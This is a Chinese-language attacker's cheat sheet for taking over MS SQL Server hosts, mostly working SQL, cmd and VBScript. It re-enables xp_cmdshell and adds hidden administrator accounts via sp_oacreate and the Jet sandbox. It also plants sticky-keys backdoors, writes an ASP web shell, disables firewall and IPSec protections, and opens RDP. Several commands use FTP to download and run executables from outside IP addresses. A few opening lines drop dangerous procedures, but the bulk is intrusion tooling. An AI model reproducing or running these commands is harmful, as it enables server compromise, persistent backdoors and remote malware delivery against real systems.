;RECONFIGURE WITH OVERRIDE --
;EXEC sp_configure   'show advanced options', 0 --
删除sql危险存储：
DROP PROCEDURE sp_makewebtask
exec master..sp_dropextendedproc xp_cmdshell
exec master..sp_dropextendedproc xp_dirtree
exec master..sp_dropextendedproc xp_fileexist
exec master..sp_dropextendedproc xp_terminate_process
exec master..sp_dropextendedproc sp_oamethod
exec master..sp_dropextendedproc sp_oacreate
exec master..sp_dropextendedproc xp_regaddmultistring
exec master..sp_dropextendedproc xp_regdeletekey
exec master..sp_dropextendedproc xp_regdeletevalue
exec master..sp_dropextendedproc xp_regenumkeys
exec master..sp_dropextendedproc xp_regenumvalues
exec master..sp_dropextendedproc sp_add_job
exec master..sp_dropextendedproc sp_addtask
exec master..sp_dropextendedproc xp_regread
exec master..sp_dropextendedproc xp_regwrite
exec master..sp_dropextendedproc xp_readwebtask
exec master..sp_dropextendedproc xp_makewebtask
exec master..sp_dropextendedproc xp_regremovemultistring
exec master..sp_dropextendedproc sp_OACreate
DROP PROCEDURE sp_addextendedproc
恢复扩展存储过程的办法
先恢复sp_addextendedproc，语句如下：
第一：
create procedure sp_addextendedproc --- 1996/08/30 20:13
@functname nvarchar(517), @dllname varchar(255) as
set implicit_transactions off
if @@trancount > 0  
begin
raiserror(15002,-1,-1,'sp_addextendedproc')  
return (1)  
end
dbcc addextendedproc( @functname, @dllname)  
return (0) -- sp_addextendedproc
GO
第二：
use master  
exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'  
exec sp_addextendedproc xp_dirtree,'xpstar.dll'  
exec sp_addextendedproc xp_enumgroups,'xplog70.dll'  
exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'  
exec sp_addextendedproc xp_loginconfig,'xplog70.dll'  
exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'  
exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'  
exec sp_addextendedproc sp_OACreate,'odsole70.dll'  
exec sp_addextendedproc sp_OADestroy,'odsole70.dll'  
exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll'  
exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'  
exec sp_addextendedproc sp_OAMethod,'odsole70.dll'  
exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'  
exec sp_addextendedproc sp_OAStop,'odsole70.dll'  
exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'  
exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'  
exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'  
exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'  
exec sp_addextendedproc xp_regread,'xpstar.dll'  
exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'  
exec sp_addextendedproc xp_regwrite,'xpstar.dll'  
exec sp_addextendedproc xp_availablemedia,'xpstar.dll'
删除扩展存储过过程xp_cmdshell的语句:
exec sp_dropextendedproc 'xp_cmdshell'
恢复cmdshell的sql语句
exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
开启cmdshell的sql语句
exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
判断存储扩展是否存在
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
返回结果为1就ok
恢复xp_cmdshell
exec master.dbo.addextendedproc 'xp_cmdshell','xplog70.dll';select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
返回结果为1就ok
否则上传xplog7.0.dll
exec master.dbo.addextendedproc 'xp_cmdshell','c:\winnt\system32\xplog70.dll'
堵上cmdshell的sql语句
sp_dropextendedproc "xp_cmdshell
一.更改sa口令方法：
用sql综合利用工具连接后，执行命令：
exec sp_password NULL,'新密码','sa'
(提示：慎用!)
二.简单修补sa弱口令.
方法1:查询分离器连接后执行：
if exists (select * from
dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]') and
OBJECTPROPERTY(id, N'IsExtendedProc') = 1)
exec sp_dropextendedproc N'[dbo].[xp_cmdshell]'
GO
然后按F5键命令执行完毕
方法2:查询分离器连接后
第一步执行：use master
第二步执行：sp_dropextendedproc 'xp_cmdshell'
然后按F5键命令执行完毕
无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）
恢复方法：查询分离器连接后,
第一步执行：sp_dropextendedproc "xp_cmdshell"
第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
恢复方法：查询分离器连接后,
第一步执行:exec sp_dropextendedproc 'xp_cmdshell'
第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'           
然后按F5键命令执行完毕
如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:
查询分离器连接后,
2000servser系统:
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user Web hacker /add'
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net localgroup administrators Web /add'
xp或2003server系统: 126错误！命令
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user Web$ hacker /add'
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators Web$ /add'
C:\>DIR C:\
SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
分析器执行的语句：
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
有时候用查询分离器连接执行以上语句的时候会出现找不到存储过程 sp_addextendedproc
解决方法:
create procedure sp_addextendedproc --- 1996/08/30 20:13
@functname nvarchar(517),
@dllname varchar(255)
as
set implicit_transactions off
if @@trancount > 0
begin
raiserror(15002,-1,-1,'sp_addextendedproc')
return (1)
end
dbcc addextendedproc( @functname, @dllname)
return (0) -- sp_addextendedproc
GO
这段代码贴入查询分离器,执行
资源管理器：
c:\windows\explorer.exe
查看目录
exec master.dbo.xp_subdirs 'c:\'
列出磁盘
exec master..xp_fixeddrives
xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行） 直接加帐号！
EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user 123 123 /add")');
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators 123 /add")');
echo Windows Registry Editor Version 5.00 >3389.reg
echo. >>3389.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] >>3389.reg
echo "Enabled"="0" >>3389.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >>3389.reg
echo "ShutdownWithoutLogon"="0" >>3389.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] >>3389.reg
echo "EnableAdminTSRemote"=dword:00000001 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] >>3389.reg
echo "TSEnabled"=dword:00000001 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] >>3389.reg
echo "Start"=dword:00000002 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] >>3389.reg
echo "Start"=dword:00000002 >>3389.reg
echo [HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] >>3389.reg
echo "Hotkey"="1" >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] >>3389.reg
echo "PortNumber"=dword:00000D3D >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] >>3389.reg
echo "PortNumber"=dword:00000D3D >>3389.reg
regedit /s 3389.reg
开3389：
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--
关3389：
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;
查看3389端口
exec xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
普通CMD后门
xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\cmd.exe'
win2K直接上PS马
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell("cmd.exe /c @echo open 60.190.176.85>>net.txt&@echo reconditeness>>net.txt&@echo 7259>>net.txt&@echo get 0.exe>>net.txt&@echo bye>>net.txt&@ftp -s:net.txt&del net.txt & 0.exe")')
win03-XP直接上PS马
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c @echo open 60.190.176.85>>net.txt&@echo reconditeness>>net.txt&@echo 7259>>net.txt&@echo get 0.exe>>net.txt&@echo bye>>net.txt&@ftp -s:net.txt&del net.txt & 0.exe")')
5下shift后门命令
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
declare @o int
exec sp_oacreate 'wscript.shell', @o out
exec sp_oamethod @o, 'run', NULL, 'XXXXX' [url=file://XXXXX/]\\XXXXX[/url]为你要执行的命令
写入注册表指定的键里指定的值)，使用方法(在键HKEY_LOCAL_MACHINE\SOFTWARE\aaa\aaaValue写入bbb)：
EXEC master..xp_regwrite
@rootkey='HKEY_LOCAL_MACHINE',
@key='SOFTWARE\aaa',
@value_name='aaaValue',
@type='REG_SZ',
@value='bbb'
@echo open 121.22.56.5>c:\bin.txt&@echo list>>c:\bin.txt&@echo list>>c:\bin.txt&@echo get gzn.exe>>c:\bin.txt&@echo bye>>c:\bin.txt&@ftp -s:c:\bin.txt&del c:\bin.txt&gzn.exe&gzn.exe&gzn.exe
先copy ftp.exe 到wmpub目录里
@echo cd c:\wmpub\>c:\wmpub\in.bat&@echo ftp -s:c:\wmpub\xiuxiu.txt>>c:\wmpub\in.bat
开3389
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\WINDOWS\system32\dllcache\net1.exe localgroup administrators IUSR_SERVER /add
SQL写一句话
exec master.dbo.xp_subdirs 'd:\web\cdlxkj';
exec sp_makewebtask 'd:\web\cdlxkj\XX.asp','select''<%execute(request("SB"))%>'' '
SA沙盒模式提权-----
----------------------
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
-------------------------------------------------------
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user sql$ 123 /add")');
-------------------------------------------------------
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators sql$ /add")');
3389   SHIFT
用上的语句:
入侵
EXEC master..xp_regwrite
@rootkey='HKEY_LOCAL_MACHINE',
@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',
@value_name='Debugger',
@type='REG_SZ',
@value='C:\WINDOWS\explorer.exe'
恢复
EXEC master..xp_regwrite
@rootkey='HKEY_LOCAL_MACHINE',
@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',
@value_name='Debugger',
@type='REG_SZ',
@value=''
映象劫持
EXEC master..xp_regwrite ---这是注册表编辑!
@rootkey='HKEY_LOCAL_MACHINE', ---这是位置!
@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE', -----这也是位置!
@value_name='Debugger', ---这是表名!
@type='REG_SZ',        ---这里是写入的意思!
@value='C:\WINDOWS\explorer.exe'   ----这里是写入内容!
整个过程是利用master..xp_regwrite这组件来完成的,
1.sql命令查询注册表粘滞键是否被劫持
exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)
xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe',
'Debugger','REG_SZ','C:\WINDOWS\system32\taskmgr.exe'
3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用
xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
sql写文件
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'c:\1.vbs', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject("WSCRIPT.NETWORK")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'os="WinNT://"&wsnetwork.ComputerName'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&"/Administrators,group")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create("user","test")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword "1234"'
exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo '
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&"/test",user) '
exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&"/test"'
无NET提权的脚本
struser=wscript.arguments(0)
strpass=wscript.arguments(1)
set lp=createObject("WSCRIPT.NETWORK")
oz="WinNT://"&lp.ComputerName
Set ob=GetObject(oz)
Set oe=GetObject(oz&"/Administrators,group")
Set od=ob.create("user",struser)
od.SetPassword strpass
od.SetInfo
Set of=GetObject(oz&"/" & struser & ",user")
oe.Add(of.ADsPath)
For Each admin in oe.Members
if struser=admin.Name then
Wscript.echo struser & " 建立成功!"
wscript.quit
end if
Next
Wscript.echo struser & " 用户建立失败!"
将以上保存为user.VBS文件
然后执行：cscript user.vbs 用户名 密码
使用jet沙盘模式，可以解决XP_cmdshell等存储过程和相关动态链接库带来的烦恼。出于安全原因，系统默认情况下沙盘模式未开启，这就需要xp_regwrite开启沙盘模式：
Exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0
\Engines','SandBoxMode','REG_DWORD',1
然后执行沙盘命令，在系统添加一个用户名为test，密码为1234的用户：
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows
\system32\ias\ias.mdb','select shell("cmd.exe /c net user test 1234 /add")')
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows
\system32\ias\ias.mdb','select shell("cmd.exe /c net localgroup
administrators test /add")')
不同的操作系统，路径也不一样，需要根据情况做修改：
NT/2K: c:\winnt\system32\
XP/2003: c:\windows\system32\
另外Microsoft SQL Server2005在默认情况下，一些存储过程是关闭着的，需要命令打开：
开启XP_cmdshell：
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure
'xp_cmdshell', 1;RECONFIGURE;
开启'OPENROWSET'：
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure
'Ad Hoc Distributed Queries',1;RECONFIGURE;
开启'sp_oacreate':
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure
'Ole Automation Procedures',1;RECONFIGURE;
下面来说sa下执行命令错误的几种情况：
1、无法装载DLL xpsql70.dll或该DLL所引用的某一DLL。原因126(找不到指定模块。)
这种情况比较常见的，修复起来说简单也简单，但是有条件的。这种情况要是能列出目录（用sqltools v2.0就有列目录功能）恭喜你这个有80%的情况能修复了，如果能列目录，那么只要找到xplog70.dll的路径执行以下命令就可以了。
第一步
exec sp_dropextendedproc 'xp_cmdshell' （这个命令就是删除原有的cmdshell，因为已经出错了）
第二步
dbcc addextendedproc ("xp_cmdshell","c:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll")
;EXEC sp_configure   'show advanced options', 0 C
当然这是sql命令，用查询分析器执行。第二步里的c:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll就是xplog70.dll的路径，这个路径是比较常见的，如果c盘没有可以找找其他盘符。
2、无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
其实这个跟上面的126是一样的就是cmdshell出错了只要找到备份的xplog70.dll按照上面的方法就能修复了。
3、未能找到存储过程'master..xpcmdshell'
这种情况我看到网上的方法是：
第一步先删除：
drop procedure sp_addextendedproc
drop procedure sp_oacreate
exec sp_dropextendedproc 'xp_cmdshell'
第二步恢复：
dbcc addextendedproc ("sp_oacreate","odsole70.dll")
dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
其实这个跟上面的还是一样，其实如果细心的话，上面的126 127只执行第一步的时候就会出现未能找到存储过程'master..xpcmdshell' 因为第一步就是删除cmdshell的存储过程。所以这种情况下只执行上面的第二个步骤就可以了。
4.Error Message:SQL Server 阻止了对组件 'xp_cmdshell' 的 过程 'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
这种情况是最简单的了，因为什么都不用考虑，直接执行以下命令就可以了
;EXEC sp_configure 'show advanced options', 1 --
;RECONFIGURE WITH OVERRIDE --
;EXEC sp_configure 'xp_cmdshell', 1 --
;RECONFIGURE WITH OVERRIDE --
;EXEC sp_configure   'show advanced options', 0 C
经过上面的修复能够执行cmd命令了，下面就要开始提权了。我一般都是ipconfig先查下ip看看是不是内网，然后REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber查看一下终端端口，再netstat Can看看终端是否打开 然后net user 用户 密码 /add 加个用户 再net localgroup administrators 用户 /add一切顺利的话，这就拿下一个服务器了。但是在这个过程中还会遇到很多问题。
1、net提权成功但是连接不上终端有下面几种情况
（1）、服务器在内网。
（2）、做了tcp/ip筛选。
先执行下面cmd命令：
cmd /c regedit -e c:\1.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip，导出注册表里关于TCP/IP筛选的第一处
cmd /c regedit -e c:\2.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip，导出注册表里关于TCP/IP筛选的第二处
cmd /c regedit -e c:\3.reg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip"，导出注册表里关于TCP/IP筛选的第三处
然后回到c盘1.reg,2.reg,3.reg，把1.reg,2.reg,3.reg下载回来到自己的硬盘里面编辑一下，找到EnableSecurityFilters这个 字段看看dword后面的键值是否为00000000，如果为00000001就说明管理员做了tcp/ip筛选，我们只要把1改成0就行了，2.reg和3.reg进行一样的修改。
（3）、做了ip安全策略。
执行cmd命令： cmd /c net stop policyagent 将IPSEC Services服务停了它。再连终端。
（4）、管理员设置的终端登陆权限只有指定的用户可以。
（5）、防火墙。 执行cmd命令： net stop alg /ynet stop sharedaccess
2、net提权出现 拒绝访问
可以尝试一下net1 user 用户 密码 /add 如果net1也是拒绝访问可以copy一个shfit后门试试执行cmd命令：copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
如果提示 复制1文件 哪么证明成功了。连接终端然后按5下shift看看蹦出来了什么。玩咔咔 资源管理器，现在只要手工加个用户就好了。
3、net提权出现 拒绝访问错误5 （重点）
这种情况就不用尝试net1了，可以试试copy shift后门，如果copy后提示复制0文件，证明没有成功。那么可以试试能不能上传，如果能上传直接传个前段时间出来的无net提权工具，然后加个用户就可以了。但是这种情况大部分都是不能上传的，那么就要考虑一下了。既然能执行cmd，那么就能通过cmd下ftp下载文件，可是ftp前提是要能写进文本或批处理。那么就可以通过sql语句写进一个文本或批处理啊。
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'C:\1.bat', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'open IP'
exec @ret = sp_oamethod @f, 'writeline', NULL,'ftp账号'
exec @ret = sp_oamethod @f, 'writeline', NULL,'ftp密码'
exec @ret = sp_oamethod @f, 'writeline', NULL,'get en.exe（无net提权脚本）c:\en.exe'
exec @ret = sp_oamethod @f, 'writeline', NULL,'bye'
查询分析器执行成功后，不出意外，会在c盘出现一个1.bat（如果执行成功了，c盘却没有，可以换个文件夹写入，因为哪个服务器c盘根目录禁止写入）
然后cmd执行ftp -s:c:\1.bat
这个执行完了以后，就会在c盘ftp下载一个无net提权脚本 或者直接写个vbs提权脚本
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'c:\1.vbs', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set o=CreateObject( "Shell.Users" )'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set z=o.create("用户")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'z.changePassword "密码",""'
exec @ret = sp_oamethod @f, 'writeline', NULL,'z.setting("AccountType")=3'
然后cmd执行cscript c:\1.vbs 就可以了
4、前面说的是修复成功能执行cmd命令的，但是有的修复后，又会出现新的问题
（1）、Message:在执行 xp_cmdshell 的过程中出错。调用 'CreateProcess' 失败，错误代码: '5'。
错误5是个系统提示的错误号，CreateProcess这个是创建线程的意思，这个错误产生和系统文件cmd.exe有很大的关系，一种情况是cmd被删除，一种是cmd的权限被降低了.
SQL查看终端端口及开放情况：
exec master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
好了，下面关键的地方了，要用到两条sql指令，将系统的explorer文件复制为系统的shift后门文件，下面两条语句为分别执行的。
这条语句将explorer.exe复制为sethc.exe
declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe','c:\windows\system32\sethc.exe';
这条语句将sethc.exe复制到dllcache目录下
declare @oo int exec sp_oacreate 'scripting.filesystemobject', @oo out exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe','c:\windows\system32\dllcache\sethc.exe';
另外这两条语句使用到的sp_oacreate存储过程需要使用到odsole70.dll这个文件，所以这个文件的存亡，关系到创建的成功与否。
（2）、xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行）
这种情况就是比较棘手的了，网上说这种情况
EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user 123 123 /add")');
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators 123 /add")');
这样直接加用户就成了，我查了查这个事利用的沙盘提权，但是通过我的实践，这个成功率很低，因为大部分的服务器都把c:\windows\system32\ias\ias.mdb给删掉了。那么可以试试映像劫持sethc，当然映像劫持也是有条件的，1 要存在xp_regwrite这个存储过程 2 就是'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'这个键值没有被删
可以先sql命令查询一下注册表粘滞键是否被劫持
exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
如果提示没有找到问题，证明被删了，没有办法了，如果提示sethc.exe 执行sql命令
EXEC master..xp_regwrite
@rootkey='HKEY_LOCAL_MACHINE',
@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',
@value_name='Debugger',
@type='REG_SZ',
@value='C:\WINDOWS\explorer.exe'
连接终端5下shift后直接进入桌面了，然后手工添加。
注册表修改终端端口
[HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ Terminal Server \ Wds \ rdpwd \ Tds \ tcp]
HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ Terminal Server \ WinStations \ RDP-Tcp，


1.查询终端端口
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber


2.开启XP&2003终端服务
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f


3.更改终端端口为2008(0x7d8)
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f


4.取消xp&2003系统防火墙对终端服务的限制及IP连接的限制
REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled:@xpsp2res.dll,-22009 /f

利用进程名结束进程
命令格式：ntsd -c q -pn ***.exe

解决终端超出了最大连接数的命令
mstsc /v:ip:3389 /console
